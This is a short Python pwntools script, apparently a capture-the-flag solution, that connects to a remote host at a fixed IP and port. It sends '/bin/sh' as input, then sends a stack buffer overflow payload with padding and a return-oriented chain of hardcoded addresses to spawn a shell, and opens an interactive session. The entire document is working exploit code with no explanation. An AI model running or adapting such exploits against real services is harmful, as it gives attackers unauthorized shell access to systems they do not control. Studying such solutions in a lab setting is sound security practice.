#!/usr/bin/env python2

from pwn import *

p = remote('140.110.112.192', 2120)

p.sendlineafter('?\n', '/bin/sh')
p.sendlineafter('?\n', 'A' * (48 + 8) + p64(0x0000000000400773) + p64(0x601070) + p64(0x004006bf))

p.interactive()
p.close()
